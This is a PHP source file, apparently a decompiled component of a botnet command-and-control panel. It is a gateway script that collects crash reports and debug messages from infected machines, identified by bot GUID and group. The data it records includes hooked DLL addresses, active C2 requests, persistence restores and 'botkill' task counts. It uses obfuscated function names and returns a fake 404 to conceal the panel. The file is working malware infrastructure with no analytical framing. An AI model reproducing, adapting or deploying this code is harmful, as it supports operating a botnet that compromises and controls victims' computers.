<?php
/*
 * @ https://EasyToYou.eu - IonCube v10 Decoder Online
 * @ PHP 5.6
 * @ Decoder version: 1.0.4
 * @ Release: 02/06/2020
 *
 * @ ZendGuard Decoder PHP 5.6
 */

define("IN_BOT_GATEWAY", 1);
define("IN_BOT_DEBUG_GATEWAY", 1);
require_once "include/core.inc";
global $sqlDefault;
global $sqlSettings;
$bGotSettingsFromCache = false;
error_reporting(0);
if (empty($_POST)) {
    exit("post empty");
}
if ($sqlSettings->IsLoaded == true) {
    $bGotSettingsFromCache = true;
    _obfuscated_0D300A34282E22250415240D132F2D3D145B3E2C1C5B01_();
}
$main_sql_link = $sqlDefault->Connect();
if (!$main_sql_link) {
    _obfuscated_0D251E34075C181A123E1F192323042A26333704120A32_(49, "(help.php) SQL Conn. failed. Error#: " . mysql_errno());
    header("HTTP/1.0 404 Not Found");
    exit(_obfuscated_0D5C0A3B01170C22303723373F1C2C013C313223220511_());
}
_obfuscated_0D2E030502393309353803265C180F1810281B0E1C1D22_($main_sql_link);
if ($bGotSettingsFromCache == false) {
    _obfuscated_0D300A34282E22250415240D132F2D3D145B3E2C1C5B01_();
    $sqlSettings->GetSettings();
}
$szBotGUID = "";
$szBotGroup = "";
$dwBotOS = "";
$dwRequestType = DEBUG_REQUEST_TYPE_CRASH_REPORT;
if (isset($_GET["id"]) && (int) $_GET["id"] == 1) {
    $dwRequestType = DEBUG_REQUEST_TYPE_DEBUG_MSGS;
}
$iVarCounter = 0;
if ($dwRequestType == DEBUG_REQUEST_TYPE_DEBUG_MSGS) {
    foreach ($_POST as $szKeyName => $pValue) {
        $iVarCounter++;
        if ($iVarCounter == 1) {
            $szBotGUID = $pValue;
            if (strlen($szBotGUID) != 32) {
                exit;
            }
        } else {
            if ($iVarCounter == 2) {
                $szBotGroup = $pValue;
                if (BOT_MAX_GROUP_NAME_CHARACTERS < strlen($szBotGroup)) {
                    $szBotGroup = substr($szBotGroup, 0, BOT_MAX_GROUP_NAME_CHARACTERS);
                }
            } else {
                if ($iVarCounter == 3) {
                    $dwBotOS = $pValue;
                } else {
                    if (3 < $iVarCounter) {
                        $szDebugMsgString = urldecode($pValue);
                        $szDebugMsgString = base64_decode($szDebugMsgString);
                        if (strlen($szDebugMsgString) < 5) {
                            exit;
                        }
                        $msg_params = explode("|", $szDebugMsgString);
                        if ($msg_params) {
                            $msg_type = (int) intval($msg_params[0]);
                            $msg_flags = (int) intval($msg_params[1]);
                            $msg_save_time = sprintf("%u", (int) $msg_params[2]);
                            $msg_text = $msg_params[3];
                            if (!is_numeric($bot_os)) {
                                $bot_os = "0";
                            }
                            $sqlDebug = new CDebug();
                            $sqlDebug->InstanceType = DEBUG_REQUEST_TYPE_DEBUG_MSGS;
                            $sqlDebug->SetInternalLink($main_sql_link);
                            _obfuscated_0D251E34075C181A123E1F192323042A26333704120A32_(51, "Adding msg (GUID: " . $szBotGUID . " // group: " . $szBotGroup . "): " . $szDebugMsgString);
                            if (!$sqlDebug->AddDebugMessage($szBotGUID, $szBotGroup, $dwBotOS, $msg_type, $msg_flags, $msg_save_time, $msg_text)) {
                                _obfuscated_0D251E34075C181A123E1F192323042A26333704120A32_(50, "(help.php) Failed to add debug message to database. Error#: " . mysql_errno());
                            }
                        }
                    }
                }
            }
        }
    }
} else {
    $sqlDebug = new CDebug();
    $sqlDebug->InstanceType = DEBUG_REQUEST_TYPE_CRASH_REPORT;
    $sqlDebug->SetInternalLink($main_sql_link);
    foreach ($_POST as $szKeyName => $pValue) {
        $iVarCounter++;
        if ($iVarCounter == 1) {
            $szBotGUID = $pValue;
            if (strlen($szBotGUID) != 32) {
                exit;
            }
        } else {
            if ($iVarCounter == 2) {
                $szBotGroup = $pValue;
                if (BOT_MAX_GROUP_NAME_CHARACTERS < strlen($szBotGroup)) {
                    $szBotGroup = substr($szBotGroup, 0, BOT_MAX_GROUP_NAME_CHARACTERS);
                }
            } else {
                if (2 < $iVarCounter) {
                    switch ($iVarCounter) {
                        case 3:
                            $sqlDebug->dwFlags = $pValue;
                            break;
                        case 4:
                            $sqlDebug->ulSystemTime = $pValue;
                            break;
                        case 5:
                            $sqlDebug->dwOSFlags = $pValue;
                            break;
                        case 6:
                            $sqlDebug->pvNtdllBaseAddress = $pValue;
                            break;
                        case 7:
                            $sqlDebug->pvKernel32BaseAddress = $pValue;
                            break;
                        case 8:
                            $sqlDebug->pvUser32BaseAddress = $pValue;
                            break;
                        case 9:
                            $sqlDebug->pvAdvapi32BaseAddress = $pValue;
                            break;
                        case 10:
                            $sqlDebug->pvWininetBaseAddress = $pValue;
                            break;
                        case 11:
                            $sqlDebug->pvWs2_32BaseAddress = $pValue;
                            break;
                        case 12:
                            $sqlDebug->pvCrypt32BaseAddress = $pValue;
                            break;
                        case 13:
                            $sqlDebug->Secur32BaseAddress = $pValue;
                            break;
                        case 14:
                            $sqlDebug->dwProcessId = $pValue;
                            break;
                        case 15:
                            $sqlDebug->dwThreadId = $pValue;
                            break;
                        case 16:
                            $sqlDebug->dwThreadLastError = $pValue;
                            break;
                        case 17:
                            $sqlDebug->dwHooks = $pValue;
                            break;
                        case 18:
                            $sqlDebug->pvBaseAddress = $pValue;
                            break;
                        case 19:
                            $sqlDebug->uBotImageSize = (int) $pValue;
                            break;
                        case 20:
                            $sqlDebug->pvHookCustomNtCallsBaseAddress = $pValue;
                            break;
                        case 21:
                            $sqlDebug->pvHookSavedCodeBaseAddress = $pValue;
                            break;
                        case 22:
                            $sqlDebug->szProcessName = urldecode($pValue);
                            break;
                        case 23:
                            $sqlDebug->dwBotInitStatus = (int) $pValue;
                            break;
                        case 24:
                            $sqlDebug->lNumActiveC2Requests = (int) $pValue;
                            break;
                        case 25:
                            $sqlDebug->lNumberOfPersistFileRestores = (int) $pValue;
                            break;
                        case 26:
                            $sqlDebug->lNumberOfActiveDownloadTasks = (int) $pValue;
                            break;
                        case 27:
                            $sqlDebug->lNumberOfActiveBotkillTasks = (int) $pValue;
                            break;
                        case 28:
                            $ctx_parts = explode("|", urldecode($pValue));
                            if ($ctx_parts && 14 <= count($ctx_parts)) {
                                list($sqlDebug->Context_Dr0, $sqlDebug->Context_Dr1, $sqlDebug->Context_Dr2, $sqlDebug->Context_Dr3, $sqlDebug->Context_Dr6, $sqlDebug->Context_Dr7, $sqlDebug->Context_Edi, $sqlDebug->Context_Esi, $sqlDebug->Context_Ebx, $sqlDebug->Context_Edx, $sqlDebug->Context_Ecx, $sqlDebug->Context_Eax, $sqlDebug->Context_Ebp, $sqlDebug->Context_Eip, $sqlDebug->Context_Esp) = $ctx_parts;
                            }
                            break;
                        case 29:
                            $sqlDebug->szEip_ModuleName = urldecode($pValue);
                            break;
                        case 30:
                            $sqlDebug->dwNumberOfNestedExceptions = (int) $pValue;
                            break;
                        case 31:
                            $sqlDebug->szExceptionModuleName = urldecode($pValue);
                            break;
                        case 32:
                            $exp_parts = explode("|", urldecode($pValue));
                            if ($exp_parts && 8 <= count($exp_parts)) {
                                list($sqlDebug->Record_ExceptionCode, $sqlDebug->Record_ExceptionFlags, $sqlDebug->Record_ExceptionAddress, $sqlDebug->Record_NumberParameters, $sqlDebug->Record_ExParam1, $sqlDebug->Record_ExParam2, $sqlDebug->Record_ExParam3, $sqlDebug->Record_ExParam4, $sqlDebug->Record_ExParam5) = $exp_parts;
                            }
                            break;
                    }
                }
            }
        }
    }
    if (32 <= (int) $iVarCounter) {
        $sqlDebug->szBotGUID = $szBotGUID;
        $sqlDebug->szGroupName = _obfuscated_0D08300701270F0205383C2F0C32021B01355B3C2C3622_($szBotGroup);
        if ($sqlDebug->AddCrashReport() == false) {
            _obfuscated_0D251E34075C181A123E1F192323042A26333704120A32_(51, "(help.php) Failed to add debug message to database. SQL Error#: " . mysql_errno());
        }
    } else {
        _obfuscated_0D251E34075C181A123E1F192323042A26333704120A32_(52, "(help.php) Not enough post variables. Only recv: " . $iVarCounter);
    }
}
function _obfuscated_0D300A34282E22250415240D132F2D3D145B3E2C1C5B01_()
{
    global $sqlSettings;
    if ($sqlSettings->Flags_Security & SECURITY_FLAGS_PANEL_GATEWAY_DISABLED) {
        header("HTTP/1.0 404 Not Found");
        exit(_obfuscated_0D5C0A3B01170C22303723373F1C2C013C313223220511_());
    }
}

?>